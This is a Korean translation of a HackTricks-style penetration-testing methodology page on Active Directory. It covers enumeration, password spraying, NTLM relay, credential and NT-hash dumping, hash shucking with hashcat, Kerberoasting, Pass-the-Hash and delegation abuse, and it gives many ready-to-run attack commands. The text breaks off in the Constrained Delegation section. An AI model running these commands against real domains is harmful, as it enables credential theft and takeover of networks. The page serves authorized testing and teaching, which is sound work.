# Active Directory 방법론

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 네트워크 내에서 **도메인**, **사용자**, **오브젝트**를 효율적으로 생성하고 관리할 수 있게 해주는 핵심 기술입니다. 대규모로 확장되도록 설계되어 다수의 사용자를 관리 가능한 **그룹** 및 **하위 그룹**으로 조직하고 다양한 수준에서 **액세스 권한**을 제어할 수 있습니다.

**Active Directory**의 구조는 주로 세 가지 계층으로 구성됩니다: **domains**, **trees**, **forests**. **domain**은 공통 데이터베이스를 공유하는 **users**나 **devices**와 같은 오브젝트들의 모음입니다. **trees**는 공통 구조로 연결된 이러한 도메인들의 그룹이며, **forest**는 신뢰 관계(**trust relationships**)를 통해 상호 연결된 여러 trees의 집합으로 조직 구조의 최상위를 형성합니다. 각 계층에서 특정 **액세스** 및 **통신 권한**을 지정할 수 있습니다.

Active Directory의 핵심 개념:

1. **Directory** – Active Directory 오브젝트와 관련된 모든 정보를 저장합니다.
2. **Object** – 디렉터리 내의 엔티티로, **users**, **groups**, 또는 **shared folders** 등을 포함합니다.
3. **Domain** – 디렉터리 오브젝트의 컨테이너 역할을 하며, 여러 domain이 하나의 **forest** 내에서 공존할 수 있고 각자 고유한 오브젝트 컬렉션을 유지합니다.
4. **Tree** – 공통 루트 도메인을 공유하는 도메인의 그룹입니다.
5. **Forest** – Active Directory에서 조직 구조의 정점으로, 여러 tree로 구성되며 이들 간에 **trust relationships**가 존재합니다.

**Active Directory Domain Services (AD DS)**는 중앙 집중식 관리 및 네트워크 내 통신에 중요한 여러 서비스를 포함합니다. 이 서비스들은 다음과 같습니다:

1. **Domain Services** – 데이터 저장을 중앙화하고 **users**와 **domains** 간의 상호작용(인증 및 검색 기능 포함)을 관리합니다.
2. **Certificate Services** – 보안 **digital certificates**의 생성, 배포 및 관리를 감독합니다.
3. **Lightweight Directory Services** – **LDAP protocol**을 통해 디렉터리 지원 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 여러 웹 애플리케이션에 대해 **single-sign-on** 기능을 제공합니다.
5. **Rights Management** – 저작물의 무단 배포 및 사용을 규제하여 보호를 돕습니다.
6. **DNS Service** – **domain names** 해석에 필수적입니다.

자세한 설명은 다음을 참고하세요: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD를 공격하는 방법을 배우려면 **Kerberos authentication process**를 정말 잘 이해해야 합니다.\
[**작동 방식을 아직 모른다면 이 페이지를 읽어보세요.**](kerberos-authentication.md)

## 치트 시트

빠르게 AD를 열람/공격하기 위해 어떤 명령을 실행할 수 있는지 한눈에 보고 싶다면 [https://wadcoms.github.io/](https://wadcoms.github.io)에서 많은 정보를 얻을 수 있습니다.

> [!WARNING]
> Kerberos 통신은 작업을 수행하기 위해 **full qualifid name (FQDN)**을 필요로 합니다. 만약 IP 주소로 머신에 접근하려고 하면, **NTLM을 사용하지 Kerberos를 사용하지 않습니다**.

## Recon Active Directory (No creds/sessions)

AD 환경에 접근은 가능하지만 자격증명/세션이 없는 경우 다음을 시도할 수 있습니다:

- **Pentest the network:**
- 네트워크 스캔을 수행하여 머신과 열린 포트를 찾고 **취약점을 익스플로잇**하거나 그들로부터 **자격증명 추출**을 시도합니다(예: [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS 열람은 웹, 프린터, shares, vpn, media 등 도메인 내 핵심 서버에 대한 정보를 제공할 수 있습니다.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 이 작업을 수행하는 방법에 대해 더 알고 싶으면 일반 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)를 확인하세요.
- **smb 서비스에서 null 및 Guest 접근 권한 확인** (현대 Windows 버전에서는 작동하지 않을 수 있음):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB 서버 열람에 대한 보다 상세한 가이드는 다음에서 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP 열람에 대한 보다 상세한 가이드는 다음에서 확인할 수 있습니다 (특히 **anonymous access**에 주의):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder로 **impersonating services**를 통해 자격증명 수집하기: [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)로 호스트에 접근
- evil-S로 **fake UPnP services**를 노출하여 자격증명 수집하기: [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 내부 문서, 소셜 미디어, 도메인 내부의 서비스(주로 웹) 및 공개적으로 이용 가능한 자료에서 사용자 이름/이름을 추출합니다.
- 회사 직원의 전체 이름을 찾으면 다양한 AD **username conventions**을 시도해볼 수 있습니다 ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). 가장 흔한 규칙은: _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3개의 _random letters 와 3개의 random numbers_ (abc123).
- 도구:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 사용자 열거

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute enum**: 잘못된 username을 요청하면 서버는 **Kerberos error** 코드 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_로 응답하여 해당 username이 유효하지 않음을 알립니다. **유효한 username**은 AS-REP에서 **TGT**를 반환하거나 _KRB5KDC_ERR_PREAUTH_REQUIRED_ 오류를 발생시켜 사용자가 pre-authentication을 요구받는다는 것을 나타냅니다.
- **No Authentication against MS-NRPC**: domain controllers의 MS-NRPC (Netlogon) 인터페이스에 대해 auth-level = 1 (No authentication)을 사용합니다. 이 방법은 MS-NRPC 인터페이스에 바인딩한 후 `DsrGetDcNameEx2` 함수를 호출하여 자격증명 없이 사용자나 컴퓨터의 존재 여부를 확인합니다. 이 유형의 열거를 구현한 도구는 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)입니다. 연구 내용은 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)에서 확인할 수 있습니다.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버를 발견했다면 **user enumeration against it**도 수행할 수 있습니다. 예를 들어 도구 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 사용자 이름 목록은 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 및 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 찾을 수 있습니다.
>
> 하지만, 이 전에 수행했어야 하는 recon 단계에서 회사에서 일하는 사람들의 **이름**을 확보해야 합니다. 이름과 성을 알면 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 스크립트를 사용해 잠재적인 유효한 사용자 이름을 생성할 수 있습니다.

### 한 개 또는 여러 개의 사용자 이름을 알고 있을 때

이미 유효한 사용자 이름은 알고 있지만 비밀번호는 모르는 경우... 다음을 시도하세요:

- [**ASREPRoast**](asreproast.md): 사용자가 _DONT_REQ_PREAUTH_ 속성을 **가지고 있지 않다면**, 해당 사용자에 대해 **AS_REP 메시지**를 요청할 수 있습니다. 이 메시지에는 사용자 비밀번호 유도값으로 암호화된 데이터 일부가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견된 각 사용자에 대해 가장 **common passwords**를 시도해보세요. 일부 사용자가 약한 비밀번호를 사용하고 있을 수 있습니다 (비밀번호 정책을 염두에 두세요!).
- 또한 사용자 메일 서버에 접근하기 위해 **spray OWA servers**를 시도할 수 있습니다.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

네트워크의 일부 프로토콜을 **poisoning**하여 크랙할 수 있는 챌린지 **hashes**를 **obtain**할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory를 열거하는 데 성공하면 **더 많은 이메일과 네트워크에 대한 더 나은 이해**를 얻을 수 있습니다. AD 환경에 접근하기 위해 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 강제할 수 있습니다.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- 빠른 서브넷 탐색은 **`netexec smb <cidr>`**로 수행하면 **domain**, **OS build**, **SMB signing requirements**, 및 **Null Auth** 정보를 제공합니다. `(signing:False)`로 표시된 멤버는 **relay-prone**하며, DC는 종종 서명(signing)을 요구합니다.
- 타깃 지정을 용이하게 하기 위해 NetExec 출력에서 바로 **hostnames in /etc/hosts**를 생성하세요:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 서명(signing) 때문에 **SMB relay to the DC is blocked** 하더라도, **LDAP** 상태는 여전히 점검하세요: `netexec ldap <dc>`는 `(signing:None)` / 약한 channel binding을 표시합니다. SMB signing이 요구되지만 LDAP signing이 비활성화된 DC는 **SPN-less RBCD** 같은 악용에 대해 여전히 유효한 **relay-to-LDAP** 타깃으로 남습니다.

### 클라이언트 측 프린터 자격증명 leaks → 대량 도메인 자격증명 검증

- 프린터/웹 UI는 가끔 **HTML에 마스킹된 관리자 비밀번호를 embed** 해 둡니다. 소스 보기/개발자 도구로 평문이 드러날 수 있습니다(예: `<input value="<password>">`), 이로 인해 Basic-auth로 scan/print 저장소에 접근할 수 있습니다.
- 회수한 프린트 작업에는 사용자별 비밀번호가 포함된 **평문 onboarding docs**가 있을 수 있습니다. 테스트할 때 페어링을 일치시켜 두세요:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM 크리덴셜 탈취

다른 PC 또는 공유에 **null or guest user**로 **접근할 수 있다면**, (예: SCF 파일 같은) 파일을 **배치**하여 누군가 접근했을 때 당신에게 **NTLM 인증을 트리거**하게 만들고, 그렇게 해서 **NTLM challenge**를 **탈취**해 크랙할 수 있습니다:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**는 이미 보유한 모든 NT hash를 NT hash에서 직접 파생되는 키 재료를 사용하는 다른, 더 느린 포맷의 후보 비밀번호로 취급합니다. Kerberos RC4 티켓, NetNTLM challenges, 또는 cached credentials에서 긴 패스프레이즈를 무차별 대입하는 대신, NT 해시를 Hashcat의 NT-candidate 모드에 넣어 평문을 알지 못한 채 비밀번호 재사용을 검증할 수 있습니다. 도메인 침해 후 수천 개의 현재 및 과거 NT 해시를 수집할 수 있을 때 특히 강력합니다.

다음을 할 때 shucking을 사용하세요:

- DCSync, SAM/SECURITY 덤프 또는 credential vaults에서 얻은 NT 코퍼스를 가지고 있고 다른 도메인/포리스트에서 재사용 여부를 테스트해야 할 때.
- RC4 기반 Kerberos 자료 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM 응답, 또는 DCC/DCC2 블롭을 캡처했을 때.
- 길고 크랙이 어려운 패스프레이즈의 재사용을 빠르게 증명하고 즉시 Pass-the-Hash로 전환하려 할 때.

이 기법은 키가 NT 해시가 아닌 암호화 타입(예: Kerberos etype 17/18 AES)에는 **작동하지 않습니다**. 도메인이 AES-only를 강제하면 일반 비밀번호 모드로 되돌아가야 합니다.

#### NT 해시 코퍼스 구성

- **DCSync/NTDS** – `secretsdump.py`를 history 옵션과 함께 사용하여 가능한 최대의 NT 해시 집합(및 이전 값들)을 가져옵니다:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History 항목은 후보군을 극적으로 넓힙니다. Microsoft는 계정당 최대 24개의 이전 해시를 저장할 수 있기 때문입니다. NTDS 비밀을 수집하는 다른 방법은 다음을 참조하세요:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)는 로컬 SAM/SECURITY 데이터와 cached domain logons(DCC/DCC2)을 추출합니다. 중복을 제거하고 해당 해시들을 동일한 `nt_candidates.txt` 목록에 추가하세요.
- **메타데이터 추적** – 각 해시를 생성한 username/domain을 함께 보관하세요(워드리스트가 헥사만 포함하더라도). Hashcat이 승리한 후보를 출력하면 매치된 해시가 어떤 주체가 비밀번호를 재사용하는지 즉시 알려줍니다.
- Shucking 시 중첩 가능성을 최대화하려면 동일한 포리스트나 신뢰된 포리스트에서 온 후보를 우선으로 하십시오.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

노트:

- NT-candidate 입력은 **항상 원시 32-hex NT 해시**여야 합니다. 룰 엔진을 비활성화하세요( `-r` 사용 금지, 하이브리드 모드 금지) — mangling(변형)이 후보 키 재료를 손상시킵니다.
- 이 모드들이 본질적으로 더 빠른 것은 아니지만, NTLM 키스페이스(~30,000 MH/s on an M3 Max)는 Kerberos RC4(~300 MH/s)보다 약 100× 빠릅니다. 선별된 NT 목록을 테스트하는 것이 느린 포맷에서 전체 비밀번호 공간을 탐색하는 것보다 훨씬 저렴합니다.
- 항상 **최신 Hashcat 빌드**를 사용하세요 (`git clone https://github.com/hashcat/hashcat && make install`) — 모드 31500/31600/35300/35400은 최근에 추가되었습니다.
- 현재 AS-REQ Pre-Auth에 대한 NT 모드는 없으며, AES etypes(19600/19700)는 키가 UTF-16LE 비밀번호에서 PBKDF2로 파생되므로 평문 비밀번호가 필요합니다(원시 NT 해시로부터 파생되지 않음).

#### 예 – Kerberoast RC4 (mode 35300)

1. 낮은 권한 사용자로 대상 SPN에 대한 RC4 TGS를 캡처합니다(자세한 내용은 Kerberoast 페이지 참조):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT 리스트로 티켓을 shuck 합니다:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat은 각 NT 후보로부터 RC4 키를 유도하고 `$krb5tgs$23$...` 블롭을 검증합니다. 매치되면 서비스 계정이 당신이 가진 기존 NT 해시 중 하나를 사용하고 있음을 확인합니다.

3. 즉시 PtH로 전환하세요:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

필요하다면 나중에 `hashcat -m 1000 <matched_hash> wordlists/`로 평문을 복구할 수 있습니다.

#### 예 – Cached credentials (mode 31600)

1. 침해된 워크스테이션에서 cached logons를 덤프합니다:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 관심 있는 도메인 사용자의 DCC2 라인을 `dcc2_highpriv.txt`에 복사하고 shuck 합니다:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 성공적인 매치는 이미 당신 목록에 있는 NT 해시를 반환하여 캐시된 사용자가 비밀번호를 재사용하고 있음을 증명합니다. 이를 PtH로 직접 사용하세요(`nxc smb <dc_ip> -u highpriv -H <hash>`) 또는 빠른 NTLM 모드로 브루트포스하여 문자열을 복구할 수 있습니다.

동일한 워크플로우가 NetNTLM challenge-responses(`-m 27000/27100`)와 DCC(`-m 31500`)에도 적용됩니다. 일단 매치가 식별되면 relay, SMB/WMI/WinRM PtH를 실행하거나 오프라인에서 마스크/룰로 NT 해시를 다시 크랙할 수 있습니다.



## 자격증명/세션으로 Active Directory 열거

이 단계에서는 유효한 도메인 계정의 **자격증명이나 세션을 침해한 상태**여야 합니다. 유효한 자격증명이나 도메인 사용자로서의 쉘이 있다면, 이전에 제시된 옵션들이 여전히 다른 사용자를 침해하는 데 사용 가능한 옵션임을 기억하세요.

인증된 열거를 시작하기 전에 **Kerberos double hop problem**이 무엇인지 알아야 합니다.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 열거

계정을 침해하는 것은 **도메인 전체를 침해하기 위한 중요한 첫걸음**입니다. 이제 **Active Directory 열거**를 시작할 수 있기 때문입니다:

[**ASREPRoast**](asreproast.md)와 관련해서는 이제 가능한 모든 취약 사용자를 찾을 수 있고, [**Password Spraying**](password-spraying.md)과 관련해서는 **모든 사용자 이름 목록**을 얻어 침해된 계정의 비밀번호, 빈 비밀번호, 또는 유력한 새 비밀번호들을 시도해볼 수 있습니다.

- 기본적인 정보를 수집하려면 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)를 사용할 수 있습니다.
- 더 은밀하게 정보를 수집하려면 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)을 사용하세요.
- 더 상세한 정보를 추출하려면 [**use powerview**](../basic-powershell-for-pentesters/powerview.md)를 사용할 수 있습니다.
- Active Directory에서의 훌륭한 리콘 도구로는 [**BloodHound**](bloodhound.md)가 있습니다. 수집 방법에 따라 **매우 은밀하지 않을 수 있으나**, 은밀성에 크게 신경 쓰지 않는다면 꼭 사용해볼 가치가 있습니다. 사용자가 어디서 RDP 가능한지, 그룹으로 가는 경로 등을 찾을 수 있습니다.
- **다른 자동 AD 열거 도구들:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD의 DNS 레코드들**](ad-dns-records.md)은 흥미로운 정보를 포함하고 있을 수 있습니다.
- GUI 도구로는 **SysInternal** Suite의 **AdExplorer.exe**를 사용할 수 있습니다.
- LDAP 데이터베이스에서 **ldapsearch**로 _userPassword_ & _unixUserPassword_ 필드, 또는 _Description_에서 자격증명을 찾아볼 수도 있습니다. 다른 방법은 PayloadsAllTheThings의 'Password in AD User comment' 섹션을 참조하세요.
- **Linux**를 사용한다면 [**pywerview**](https://github.com/the-useless-one/pywerview)로 도메인을 열거할 수 있습니다.
- 자동화 도구로는 다음을 시도해볼 수 있습니다:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **모든 도메인 사용자 추출하기**

Windows에서는 도메인 사용자명을 얻는 것이 매우 쉽습니다 (`net user /domain`, `Get-DomainUser` 또는 `wmic useraccount get name,sid`). Linux에서는 `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`를 사용할 수 있습니다.

> 이 열거 섹션이 짧아 보일지라도 이것이 전체에서 가장 중요한 부분입니다. (특히 cmd, powershell, powerview, BloodHound 링크들을) 방문하여 도메인 열거 방법을 배우고 익숙해질 때까지 연습하세요. 평과 중 이 순간이 DA로 가는 길을 찾거나 더 이상 진행할 수 없음을 판단하는 핵심 순간이 될 것입니다.

### Kerberoast

Kerberoasting은 사용자 계정에 연결된 서비스가 사용하는 **TGS tickets**를 획득하고, 그 암호화(사용자 비밀번호에 기반)를 **오프라인**에서 크랙하는 것을 포함합니다.

자세한 내용은 다음을 참조하세요:

{{#ref}}
kerberoast.md
{{#endref}}

### 원격 접속 (RDP, SSH, FTP, Win-RM 등)

자격증명을 획득했다면 어떤 **머신**에 접근 가능한지 확인해보세요. 이 목적을 위해 포트 스캔 결과에 따라 여러 서버에 다양한 프로토콜로 접속 시도를 하기 위해 **CrackMapExec**를 사용할 수 있습니다.

### 로컬 권한 상승

일반 도메인 사용자로서 자격증명이나 세션을 침해했고 해당 사용자로 **도메인 내의 어떤 머신에든 접근할 수 있다면**, 로컬 권한 상승 경로를 찾아 자격증명을 수집하려 시도해야 합니다. 로컬 관리자 권한이 있어야만 메모리(LSASS)나 로컬(SAM)에서 다른 사용자의 해시를 덤프할 수 있기 때문입니다.

이 책에는 [**Windows에서의 로컬 권한 상승**](../windows-local-privilege-escalation/index.html)에 관한 전체 페이지와 [**체크리스트**](../checklist-windows-privilege-escalation.md)가 있습니다. 또한 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)를 사용하는 것도 잊지 마세요.

### 현재 세션 티켓

현재 사용자 세션에서 예상치 못한 리소스에 접근 권한을 부여하는 **티켓**을 찾을 가능성은 매우 **낮습니다**, 하지만 다음을 확인해볼 수 있습니다:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

이제 기본 credentials을 확보했다면 AD 내부에서 **공유되고 있는 흥미로운 파일**이 있는지 **확인**해야 합니다. 수동으로 할 수 있지만 매우 지루하고 반복적인 작업입니다(확인해야 할 문서가 수백 개라면 더 그렇습니다).

[**사용할 수 있는 도구에 대해 알아보려면 이 링크를 따라가세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

다른 PC나 shares에 **접근할 수 있다면**, SCF 파일과 같은 파일을 **배치**하여 누군가 그 파일에 접근했을 때 당신에게 대한 **NTLM authentication을 유발**하도록 만들 수 있습니다. 이렇게 하면 크랙할 수 있는 **NTLM challenge**를 **탈취**할 수 있습니다:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점은 인증된 어떤 사용자라도 **domain controller를 침해**할 수 있도록 허용했습니다.

{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory에서 privileged credentials/session을 사용한 권한 상승

**다음 기법들은 일반 도메인 사용자 계정만으로는 충분하지 않으며, 이러한 공격을 수행하려면 일부 특수한 privileges/credentials가 필요합니다.**

### Hash extraction

운 좋게도 [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying 포함), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) 등을 사용해 **일부 local admin 계정**을 탈취했다면, 그다음에는 메모리와 로컬에서 모든 해시를 덤프할 차례입니다.\
[**해시를 획득하는 다양한 방법에 대해 이 페이지를 읽어보세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**사용자의 hash를 확보하면**, 이를 사용해 해당 사용자를 **사칭(impersonate)** 할 수 있습니다.\
해당 hash를 사용해 **NTLM authentication을 수행**할 수 있는 **도구**를 사용하거나, 새로운 **sessionlogon**을 생성하고 그 **hash를 LSASS 내부에 주입(inject)**하여 어떤 **NTLM authentication이 수행될 때** 그 **hash가 사용되게** 할 수 있습니다. 후자는 mimikatz가 수행하는 방식입니다.\
[**자세한 내용은 이 페이지를 읽어보세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 Pass The Hash over NTLM 프로토콜의 대안으로, **사용자의 NTLM hash를 사용해 Kerberos 티켓을 요청하는 것**을 목표로 합니다. 따라서 NTLM 프로토콜이 비활성화되어 있고 인증 프로토콜로 **Kerberos만 허용되는 네트워크**에서 특히 **유용**할 수 있습니다.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

만약 local administrator의 **hash** 또는 **password**를 가지고 있다면, 이를 사용해 다른 **PC**에 **로컬 로그인**을 시도해보세요.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 이것은 꽤 **시끄러울 수 있으며**, **LAPS**가 이를 **완화**할 수 있음을 유의하세요.

### MSSQL Abuse & Trusted Links

사용자가 **MSSQL 인스턴스에 접근할 권한**이 있다면, MSSQL 호스트에서 **명령을 실행**(SA로 실행 중인 경우)하거나 NetNTLM **해시를 훔치거나** 심지어 **relay 공격을 수행**할 수 있습니다.\
또한, MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰(database link)되어 있는 경우, 사용자가 신뢰된 데이터베이스에 대한 권한을 가지고 있다면 **신뢰 관계를 이용해 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 체인으로 연결될 수 있으며, 결국 사용자는 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수 있습니다.\
**데이터베이스 간 링크는 포리스트 트러스트를 넘어서서도 작동합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

서드파티 인벤토리 및 배포 솔루션은 자격증명과 코드 실행으로 연결되는 강력한 경로를 자주 노출합니다. 참조:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

속성 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)을 가진 Computer 객체를 찾고 해당 컴퓨터에 도메인 권한이 있다면, 그 컴퓨터에 로그인하는 모든 사용자의 메모리에서 TGT를 덤프할 수 있습니다.\
따라서 **Domain Admin이 해당 컴퓨터에 로그인하면**, 그의 TGT를 덤프하여 [Pass the Ticket](pass-the-ticket.md)를 사용해 그를 가장할 수 있습니다.\
constrained delegation 덕분에 **Print Server를 자동으로 탈취**할 수도 있습니다(운이 좋다면 그게 DC일 수 있음).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자 또는 컴퓨터가 "Constrained Delegation"에 허용되어 있다면, 해당 주체는 **컴퓨터의 특정 서비스에 대해 어떤 사용자로서든 액세스할 수 있도록 가장할 수 있습니다**.\
